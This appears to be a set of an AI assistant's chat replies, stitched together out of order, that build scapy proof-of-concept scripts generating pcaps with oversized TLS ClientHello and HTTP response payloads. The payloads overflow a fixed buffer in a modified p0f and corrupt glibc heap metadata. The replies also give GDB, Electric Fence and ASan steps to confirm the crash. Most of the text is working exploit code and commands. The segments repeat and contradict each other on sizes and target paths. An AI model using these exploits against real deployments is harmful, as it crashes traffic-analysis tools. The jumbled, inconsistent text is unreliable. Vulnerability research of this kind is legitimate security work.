```python
#!/usr/bin/env python3
# poc_tls_crash.py
# triggers heap corruption crash via two TLS flows against modified p0f
# flow 1: oversized ClientHello overflows fixed 1024 dest, corrupts adjacent chunk header
# flow 2: ck_alloc walks corrupted freelist, glibc aborts
# authorized lab use only

from scapy.all import Ether, IP, TCP, Raw, wrpcap
import struct, os

CLI = "10.0.0.10"
SRV = "10.0.0.20"
SP  = 443

# overflow size: enough to clear the 1024 buffer and reach the next chunk header
# glibc chunk header is 16 bytes, add 32 for alignment margin
OVERFLOW_SIZE = 1024 + 48

pkts = []

def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    pkt = Ether()/IP(src=src, dst=dst)/TCP(
              sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)
    if payload:
        pkt = pkt/Raw(payload)
    return pkt

def build_clienthello(pad_size):
    """
    Build a valid-enough TLS ClientHello to pass the 0x16 dispatch check
    and reach the memcpy. Structural validation happens after the copy,
    so we don't need a fully conformant hello.
    """
    random_bytes = os.urandom(32)
    session_id   = os.urandom(32)

    # a few real cipher suites
    ciphers   = b"\xc0\x2c\xc0\x2b\xc0\x30\xc0\x2f\x00\x9f\x00\x9e"
    comp      = b"\x01\x00"

    # SNI extension
    sni_host = b"example.com"
    sni_ext  = (b"\x00\x00" +
                struct.pack("!H", len(sni_host) + 5) +
                struct.pack("!H", len(sni_host) + 3) +
                b"\x00" +
                struct.pack("!H", len(sni_host)) +
                sni_host)

    # padding extension 0x0015 — RFC 7685, legitimate padding mechanism
    # this is where we push the total size past the 1024 destination buffer
    padding_data = b"\x00" * pad_size
    ext_padding  = (b"\x00\x15" +
                    struct.pack("!H", len(padding_data)) +
                    padding_data)

    extensions = sni_ext + ext_padding
    ext_len    = struct.pack("!H", len(extensions))

    hello_body = (b"\x03\x03" +
                  random_bytes +
                  bytes([len(session_id)]) + session_id +
                  struct.pack("!H", len(ciphers)) + ciphers +
                  comp +
                  ext_len + extensions)

    # handshake header: type=ClientHello(1), 3-byte length
    hs = b"\x01" + struct.pack("!I", len(hello_body))[1:] + hello_body

    # TLS record: type=22(0x16), version=TLS1.0, 2-byte length
    # byte[0] == 0x16 is the dispatch check that routes to process_tls
    record = b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs

    return record

# ----------------------------------------------------------------
# FLOW 1 — oversized ClientHello
# memcpy overflows 1024 dest, stomps adjacent chunk header
# p0f returns "malformed" cleanly — no crash yet
# ----------------------------------------------------------------
CP1   = 44444
cseq1 = 1000
sseq1 = 9000

# three-way handshake
pkts.append(seg(CLI, SRV, CP1, SP, cseq1, 0,     "S"))
cseq1 += 1
pkts.append(seg(SRV, CLI, SP, CP1, sseq1, cseq1, "SA"))
sseq1 += 1
pkts.append(seg(CLI, SRV, CP1, SP, cseq1, sseq1, "A"))

# oversized ClientHello — the overflow
hello1 = build_clienthello(OVERFLOW_SIZE)
pkts.append(seg(CLI, SRV, CP1, SP, cseq1, sseq1, "PA", hello1))
cseq1 += len(hello1)
pkts.append(seg(SRV, CLI, SP,  CP1, sseq1, cseq1, "A"))

print(f"[+] flow 1 ClientHello: {len(hello1)} bytes "
      f"(overflow by {OVERFLOW_SIZE} past 1024 dest)")

# ----------------------------------------------------------------
# FLOW 2 — small ClientHello, new source port = new flow
# ck_alloc for new packet_flow struct walks corrupted freelist
# glibc heap check fires here -> SIGABRT / malloc(): corrupted top size
# ----------------------------------------------------------------
CP2   = 44445
cseq2 = 2000
sseq2 = 5000

pkts.append(seg(CLI, SRV, CP2, SP, cseq2, 0,     "S"))
cseq2 += 1
pkts.append(seg(SRV, CLI, SP, CP2, sseq2, cseq2, "SA"))
sseq2 += 1
pkts.append(seg(CLI, SRV, CP2, SP, cseq2, sseq2, "A"))

# small hello — just needs to trigger ck_alloc for the new flow struct
hello2 = build_clienthello(64)
pkts.append(seg(CLI, SRV, CP2, SP, cseq2, sseq2, "PA", hello2))

print(f"[+] flow 2 ClientHello: {len(hello2)} bytes (triggers ck_alloc on corrupted heap)")

wrpcap("poc_tls_crash.pcap", pkts)
print("[+] wrote poc_tls_crash.pcap")
print()
print("run:")
print("  p0f -r poc_tls_crash.pcap")
print("  # expect: malloc(): corrupted top size / SIGABRT on flow 2")
print()
print("for clean crash site without recompile:")
print("  LD_PRELOAD=libefence.so p0f -r poc_tls_crash.pcap")
print("  # crashes inside memcpy on flow 1 instead")
```

Run it:
```bash
python3 poc_tls_crash.py
p0f -r poc_tls_crash.pcap
```

**Expected output:**
```
flow 1: [malformed TLS] or similar, returns cleanly
flow 2: malloc(): corrupted top size
        Aborted (core dumped)
```

**If it doesn't crash on flow 2**, the overflow didn't reach the chunk header. Increase `OVERFLOW_SIZE` in increments of 16 (glibc alignment boundary) until it fires. If it crashes on flow 1 instead, the corruption was large enough to hit something glibc checks during the flow 1 processing itself.

**GDB to see both events:**
```bash
gdb --args p0f -r poc_tls_crash.pcap
(gdb) break memcpy@plt
(gdb) run
# on hit — confirm overflow
(gdb) p/u $rdx          # copy length, should be >> 1024
(gdb) set $end = $rdi + 1024
(gdb) watch *$end       # watchpoint at first out-of-bounds byte
(gdb) continue          # fires mid-memcpy on flow 1
(gdb) continue          # then SIGABRT on ck_alloc during flow 2
```

Yes. The challenge is that `memcpy` itself doesn't validate bounds, so you need to either force an immediate memory fault or corrupt something that gets dereferenced before the function returns. A few approaches in order of reliability:

**Easiest: Electric Fence / libefence**

This is the fastest path without recompiling with ASan. It places each heap allocation immediately before a guard page, so any overflow faults on the first out-of-bounds byte, right at the `memcpy` instruction:

```bash
sudo apt install electric-fence
LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libefence.so p0f -r poc_tls.pcap
```

Segfault will happen inside `memcpy` itself. GDB will show the exact write that crossed the boundary.

**Reliable: ASan build**

If you have the source or can recompile:
```bash
CFLAGS="-fsanitize=address -g" make
./p0f -r poc_tls.pcap
```
ASan fires at the exact `memcpy` instruction with the overflow offset reported precisely.

**Without either: overflow into the next chunk header**

glibc heap layout looks like this in memory:

```
[ chunk header 16B ][ your 1024B buffer ][ chunk header 16B ][ next allocation ]
```

If your copy is large enough to reach and corrupt the `size` field of the next chunk header, glibc's heap consistency check aborts on the very next `malloc`/`free`/`realloc` call. Since p0f calls `ck_realloc` on every new flow segment, a second packet after the overflow usually triggers it quickly. To maximize the chance of hitting the next chunk header, make the payload:

```python
# in build_clienthello(), set pad_size to just over 1024 + 16
# to reach the next chunk header
OVERSIZE = 1024 + 32   # clears the buffer and stomps the next chunk metadata
```

Then in your pcap, add a second TLS flow right after:

```python
# second flow — forces a heap allocation that trips over corrupted metadata
CP2 = 44445
pkts.append(seg(CLI, SRV, CP2, SP, 2000, 0, "S"))
pkts.append(seg(SRV, CLI, SP, CP2, 5000, 2001, "SA"))
pkts.append(seg(CLI, SRV, CP2, SP, 2001, 5001, "A"))

clienthello2 = build_clienthello(64)   # small, just to trigger ck_alloc
pkts.append(seg(CLI, SRV, CP2, SP, 2001, 5001, "PA", clienthello2))
```

The `ck_alloc` for the new flow hits the corrupted chunk and aborts with a glibc heap error.

**In GDB specifically**

Set a watchpoint on the byte just past the buffer. Break on `memcpy@plt`, read `rdi` (dest), then:

```
(gdb) break memcpy@plt
(gdb) run -r poc_tls.pcap
# when hit:
(gdb) set $buf_end = $rdi + 1024
(gdb) watch *$buf_end
(gdb) continue
```

The watchpoint fires the moment `memcpy` writes past byte 1024, stopping execution right at the overflow write. This is the most precise confirmation short of ASan since it tells you the exact offset where it crosses the boundary.

Of the above, libefence is the fastest to get a clean crash without any recompilation. What does your lab setup look like — can you recompile, or are you working from the binary only?


Notes that matter for whether it fires:

The response payload must land in one segment, since the overflow is per-`memcpy`. Keep it under `MAX_FLOW_DATA` (8192) but over 1024, so a crash points specifically at the destination-size mismatch rather than the general 8 KB cap. If nothing happens, bump `OVERSIZE` toward and past 8192 to check whether the outer clamp is doing anything at all.

Build the target with `-fsanitize=address -g` if you can compile it. Without source, run it under `valgrind` instead, though ASan catches this class far more reliably. Because p0f's allocator rounds up to KB boundaries, a plain run may not crash even when corruption occurs, so don't trust "no segfault" as a negative; the sanitizer is what makes the result trustworthy.

You may need `-p` (promisc) off and to match the link type; a pcap of Ethernet frames replays cleanly with defaults. If p0f rejects the offset, check that `find_offset` picks Ethernet (link type 1), which the `Ether()` layer gives you.

One thing I won't guess at for you is the exact destination size and clamp constant, since those are the unverified bits. If the real dest is 1024, this fires; if it's actually 2048 or the clamp is `sizeof(buf)`, adjust `OVERSIZE` or expect no crash accordingly. Once you're back at the binary and can read the `memcpy` bound, plug the true numbers in.

Want me to add response segmentation (splitting across multiple ACKed segments to probe the append-offset variant) or a link-type/offset sanity harness to that generator?



Good observation, and this is an important distinction about how heap overflows behave.

**No, it won't necessarily crash inside the function.** A heap overflow is a deferred bug. `memcpy` writes past the allocation boundary and returns successfully — it has no idea it just stomped on adjacent heap memory. The crash surfaces later, at whatever heap operation next touches the corrupted region: a `malloc`, `free`, or `realloc` elsewhere in the code, possibly in a completely unrelated path. Without ASan, the function can return cleanly, log "malformed", and the corruption just sits there until something trips over it. That's actually what makes heap overflows harder to diagnose than stack overflows.

**What you can confirm right now in GDB** without needing a crash: break on `memcpy@plt` inside `process_tls` and read the arguments directly. On x86-64 that's `rdi` (dest), `rsi` (src), `rdx` (count):

```
(gdb) break memcpy@plt
(gdb) run -r poc_tls.pcap
(gdb) p/x $rdx          # copy length
(gdb) p/x $rdi          # destination address
# then check the allocation size of the destination chunk:
(gdb) x/4gx ($rdi - 16) # read glibc chunk header preceding the buffer
                         # chunk size field tells you the real allocation
```

If `rdx` is larger than the destination chunk size, the overflow is confirmed right there, no crash required.

**The memmove you're seeing** is likely the NAT score shift from `add_nat_score`:
```c
memmove(scores, scores + 1, NAT_SCORES - 1);
```
That runs on a small fixed array on a `host_data` struct. If `memcpy` already corrupted adjacent heap, `memmove` touching nearby memory is a candidate for where an eventual crash could surface, but it can also pass cleanly if it didn't hit the corrupted region.

**The malformed path is actually useful.** The fact that the malformed check happens after `memcpy` returns means a structurally invalid ClientHello still exercises the copy. So you don't need a fully valid handshake to trigger the overflow — which simplifies the PoC. What matters is that byte `[0] == 0x16` passes the initial dispatch check (which your current PoC handles), and the copy runs before the structural validation bails out.

**To get a reliable crash signal** without ASan, run the PoC, let it return "malformed", then send a second packet on a new flow so p0f calls `ck_alloc` or `ck_realloc` again. If the first pass corrupted a heap chunk header, the next allocator call is where glibc's internal consistency check fires and aborts. Alternatively, compile with ASan and it'll fire at the exact `memcpy` instruction with the overflow offset clearly reported.

The GDB argument read is the fastest path to confirm right now though — what does `rdx` show at that `memcpy@plt` breakpoint?



Good updates, two important corrections to the PoC then.

**On the 3rd ACK:** that's expected p0f behavior. The SYN and SYN-ACK carry the TCP fingerprint data p0f cares about. The bare ACK has no options to fingerprint so it doesn't generate output, but the flow state was tracked internally, which is why subsequent data packets get processed. The PoC is fine there.

**On the actual bug:** the dispatch is `if not http → process_tls`, and the overflow fires on the TLS ClientHello being copied into the fixed buffer. That changes the PoC significantly — destination port 443, client-side data, and a crafted ClientHello payload instead of an HTTP request:

```python
#!/usr/bin/env python3
# poc_tls.py — triggers overflow in process_tls() via oversized ClientHello
# authorized lab use only
from scapy.all import Ether, IP, TCP, Raw, wrpcap
import struct, os

CLI = "10.0.0.10"; SRV = "10.0.0.20"
CP, SP = 44444, 443          # TLS port — routes to process_tls not process_http
OVERSIZE = 2048              # > 1024 dest, < MAX_FLOW_DATA(8192)

cseq = 1000; sseq = 9000
pkts = []

def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    pkt = Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)
    if payload:
        pkt = pkt/Raw(payload)
    return pkt

# --- TCP handshake ---
pkts.append(seg(CLI, SRV, CP, SP, cseq, 0, "S"));              cseq += 1
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "SA"));          sseq += 1
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "A"))
# bare ACK — p0f tracks flow state but produces no output here, expected

# --- Craft oversized TLS ClientHello ---
# pad via a large session ID or repeated extensions to cross the 1024 dest boundary
# while staying under MAX_FLOW_DATA so the clamp doesn't save it

def build_clienthello(pad_size):
    # TLS random (32 bytes)
    random_bytes = os.urandom(32)

    # session ID — use 32 bytes (max valid length)
    session_id = os.urandom(32)

    # cipher suites — a few real ones
    ciphers = b"\xc0\x2c\xc0\x2b\xc0\x30\xc0\x2f\x00\x9f\x00\x9e"
    cipher_len = struct.pack("!H", len(ciphers))

    # compression methods
    comp = b"\x01\x00"

    # padding extension (type 0x0015) — this is where we stuff the size
    padding_data = b"\x00" * pad_size
    ext_padding = (b"\x00\x15" +                        # extension type: padding
                   struct.pack("!H", len(padding_data)) +
                   padding_data)

    # SNI extension
    sni_host = b"example.com"
    sni_ext = (b"\x00\x00" +                            # extension type: SNI
               struct.pack("!H", len(sni_host) + 5) +
               struct.pack("!H", len(sni_host) + 3) +
               b"\x00" +
               struct.pack("!H", len(sni_host)) +
               sni_host)

    extensions = sni_ext + ext_padding
    ext_len = struct.pack("!H", len(extensions))

    # ClientHello body
    hello_body = (b"\x03\x03" +                         # TLS 1.2 client version
                  random_bytes +
                  bytes([len(session_id)]) + session_id +
                  cipher_len + ciphers +
                  comp +
                  ext_len + extensions)

    # Handshake header: type=ClientHello(1), length (3 bytes)
    hs_hdr = b"\x01" + struct.pack("!I", len(hello_body))[1:]

    # TLS record layer: type=22 (handshake), version=TLS1.0, length
    record = (b"\x16\x03\x01" +
              struct.pack("!H", len(hs_hdr + hello_body)) +
              hs_hdr + hello_body)
    return record

clienthello = build_clienthello(OVERSIZE)
print(f"ClientHello record size: {len(clienthello)} bytes")

pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "PA", clienthello))
cseq += len(clienthello)

wrpcap("poc_tls.pcap", pkts)
print("wrote poc_tls.pcap")
```

Run it the same way:
```
python3 poc_tls.py
p0f -r poc_tls.pcap   # add ASan build or valgrind
```

**Key differences from the HTTP version:**

- Port 443 is what likely routes to `process_tls` in the dispatch check. If the dispatch is content-based rather than port-based (checks for TLS record byte `0x16`), the `build_clienthello()` structure handles that since it starts with a valid TLS record header.
- The ClientHello is client→server, so it lands in `f->request` / `req_len` side of the flow, not `f->response`. That matters because if the fixed buffer is on the request side the overflow fires on this first data segment. If `process_tls` mirrors the `process_http` response-side pattern and you need a ServerHello to trigger it, add one after the client hello with `seg(SRV, CLI, SP, CP, sseq, cseq, "PA", serverhello)`.
- The padding extension (`0x0015`) is a legitimate TLS extension designed exactly for padding, so it produces a well-formed ClientHello that passes any structure checks before the copy.

Two things to confirm when you're back at the binary: which side of the flow (`request` vs `response` buffer) the copy lands in, and whether the dispatch is port-based or content-based. Both change which segment triggers the overflow.

The honest version of what this PoC does: it confirms or refutes the theory. Under the conditions you described (copy inside `process_http`, fixed ~1024 destination, clamp still `MAX_FLOW_DATA`), it should trigger an ASan heap-write. If it doesn't fire, that's a real result too and probably means one of the three unverified assumptions was wrong. Treat a non-crash as informative, not as "try harder to break it."

The trigger condition is a single HTTP **response** segment whose payload exceeds the destination buffer (1024). But p0f's state machine won't parse a response until the flow looks like a real HTTP session, so the PoC has to walk the flow through the states you saw: SYN, SYN+ACK, an ACK, a client request (so `http_req_done` gets set), then the oversized server response in a data segment on an established flow. A lone big packet won't reach the vulnerable branch.

Here's a generator using scapy. It writes a pcap; you replay it offline, which is cleaner and more reproducible than live injection.

```python
#!/usr/bin/env python3
# poc_gen.py — builds a pcap that walks a flow to the HTTP response parse path
# with an oversized response segment. For authorized testing on your own box.
from scapy.all import Ether, IP, TCP, Raw, wrpcap

CLI = "10.0.0.10"; SRV = "10.0.0.20"
CP, SP = 44444, 80
OVERSIZE = 4096          # > 1024 dest, < MAX_FLOW_DATA(8192): isolates the dest-size bug

cseq = 1000; sseq = 9000
pkts = []
def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    return Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)/Raw(payload) if payload \
           else Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)

# handshake
pkts.append(seg(CLI, SRV, CP, SP, cseq, 0, "S"));            cseq += 1
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "SA"));        sseq += 1
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "A"))

# minimal client request so http_req_done is set
req = b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "PA", req));   cseq += len(req)
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "A"))

# oversized server response segment — the trigger
resp = b"HTTP/1.1 200 OK\r\nServer: " + b"A"*OVERSIZE + b"\r\n\r\n"
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "PA", resp))

wrpcap("poc.pcap", pkts)
print(f"wrote poc.pcap, response payload {len(resp)} bytes")
```

Run it against an ASan build of your target on the lab box:

```
python3 poc_gen.py
p0f -r poc.pcap
```

Notes that matter for whether it fires:

The response payload must land in one segment, since the overflow is per-`memcpy`. Keep it under `MAX_FLOW_DATA` (8192) but over 1024, so a crash points specifically at the destination-size mismatch rather than the general 8 KB cap. If nothing happens, bump `OVERSIZE` toward and past 8192 to check whether the outer clamp is doing anything at all.
